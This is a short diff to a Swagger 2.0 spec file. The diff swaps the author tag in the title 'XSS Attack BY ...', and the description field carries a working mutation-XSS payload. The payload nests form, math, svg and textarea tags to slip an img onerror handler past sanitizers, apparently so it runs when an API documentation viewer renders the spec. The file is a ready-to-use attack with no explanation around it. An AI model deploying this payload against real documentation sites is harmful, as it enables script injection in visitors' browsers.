@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY M41N
+  title: XSS Attack BY HPT
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(window.origin); src=1>"></form>
 
